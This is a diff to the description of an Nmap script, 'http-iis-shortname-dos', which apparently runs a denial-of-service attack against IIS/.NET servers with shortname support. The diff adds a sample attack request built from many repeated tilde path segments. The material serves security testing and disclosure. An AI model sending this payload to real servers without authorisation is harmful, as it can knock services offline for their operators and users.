@@ -1,9 +1,12 @@
 description = [[
 http-iis-shortname-dos launches a Denial of Service attack that exploits a vulnerability in IIS/.NET installations with shortname support enabled.
 
-This script sends specially crafted requests to cause the target to make numerous file system calls and run out of resources. 
+This script sends specially crafted requests to cause the target to make numerous file system calls and run out of resources. A request looks like this:
 
-Tested on .NET 4 with IIS 7
+GET /190~0/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/
+    ~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/nMaP~.AsPx?aspxerrorpath=/ HTTP/1.1
+
+* Tested on .NET 4 with IIS 7
 
 References:
 * http://soroush.secproject.com/downloadable/iis_tilde_dos.txt
